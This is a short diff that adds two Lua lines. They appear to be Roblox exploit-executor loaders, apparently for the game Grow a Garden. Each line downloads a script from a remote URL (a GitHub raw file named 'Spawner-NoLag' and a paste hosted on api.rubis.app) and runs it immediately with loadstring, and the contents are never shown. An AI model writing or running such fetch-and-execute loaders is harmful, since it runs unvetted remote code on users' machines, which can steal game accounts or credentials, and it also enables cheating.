@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaScriptzHub/Growagarden/refs/heads/main/Spawner-NoLag"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/rdrEKEspPLqeeKzu/raw", true))()
